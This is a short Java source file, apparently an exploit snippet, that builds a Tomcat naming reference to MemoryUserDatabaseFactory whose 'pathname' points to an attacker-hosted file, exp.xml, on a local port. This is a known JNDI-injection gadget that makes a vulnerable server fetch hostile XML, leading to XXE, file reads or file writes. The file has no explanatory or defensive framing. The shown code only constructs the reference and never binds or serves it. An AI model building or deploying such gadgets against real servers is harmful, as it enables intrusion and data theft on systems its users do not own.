package com.beans;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

public class TomcatXxe {
    public static void main(String[] args) {
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "",
                "",true,"org.apache.catalina.users.MemoryUserDatabaseFactory",null);
        ref.add(new StringRefAddr("pathname","http://127.0.0.1:8888/exp.xml"));
    }
}
